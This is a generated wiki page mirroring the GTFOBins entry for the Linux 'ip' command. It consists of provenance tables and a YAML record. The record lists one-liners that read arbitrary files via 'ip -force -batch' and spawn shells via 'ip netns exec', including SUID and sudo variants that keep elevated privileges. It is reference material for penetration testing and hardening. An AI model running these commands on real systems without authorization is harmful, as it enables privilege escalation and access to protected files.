---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# ip

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `ip` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ip` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [ip](../../tools/linux/ip.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | ip |
| name | ip |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/ip/ |

## Preserved Source Material

```yaml
_body: ''
_name: ip
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ip
functions:
  file-read:
  - binary: false
    code: ip -force -batch /path/to/input-file
    comment: The read file content is corrupted by error prints.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  shell:
  - code: 'ip netns add foo

      ip netns exec foo /bin/sh

      ip netns delete foo'
    contexts:
      sudo: null
      suid:
        code: 'ip netns add foo

          ip netns exec foo /bin/sh -p

          ip netns delete foo'
    version: This only works for Linux with `CONFIG_NET_NS=y`.
  - code: 'ip netns add foo

      ip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar

      ip netns exec bar /bin/sh

      ip netns delete foo

      ip netns delete bar'
    contexts:
      sudo: null
    version: This only works for Linux with `CONFIG_NET_NS=y`.
```
